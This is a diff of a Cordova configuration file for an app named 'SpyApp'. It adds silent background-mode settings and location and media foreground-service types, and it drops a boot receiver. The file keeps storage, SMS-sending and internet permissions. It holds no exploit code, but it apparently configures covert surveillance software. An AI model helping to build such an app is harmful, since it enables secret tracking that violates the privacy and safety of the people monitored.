@@ -3,12 +3,18 @@
     <name>SpyApp</name>
     <content src="index.html" />
     <access origin="*" />
+    
+    <!-- السماح بالروابط -->
     <allow-intent href="http://*/*" />
     <allow-intent href="https://*/*" />
     <allow-intent href="tel:*" />
     <allow-intent href="sms:*" />
     <allow-intent href="mailto:*" />
     <allow-intent href="geo:*" />
+
+    <!-- إعدادات أذونات الخلفية -->
+    <preference name="BackgroundModeEnabled" value="true" />
+    <preference name="BackgroundModeSilent" value="false" />
     <preference name="android-targetSdkVersion" value="34" />
 
     <!-- الإضافات (Plugins) -->
@@ -24,6 +30,7 @@
     <plugin name="cordova-plugin-background-mode" />
 
     <platform name="android">
+        <!-- الأذونات -->
         <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
             <manifest xmlns:android="http://schemas.android.com/apk/res/android">
                 <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
@@ -36,20 +43,12 @@
                 <uses-permission android:name="android.permission.SEND_SMS" />
                 <uses-permission android:name="android.permission.INTERNET" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-                <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-                <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
             </manifest>
         </edit-config>
 
+        <!-- إعداد التطبيق للتشغيل في الخلفية -->
         <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest/application">
-            <application xmlns:android="http://schemas.android.com/apk/res/android" android:usesCleartextTraffic="true">
-                <receiver android:enabled="true" android:exported="true" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
-                    <intent-filter>
-                        <action android:name="android.intent.action.BOOT_COMPLETED" />
-                        <category android:name="android.intent.category.DEFAULT" />
-                    </intent-filter>
-                </receiver>
-            </application>
+            <application android:usesCleartextTraffic="true" android:foregroundServiceType="mediaPlayback|location" />
         </edit-config>
     </platform>
 </widget>
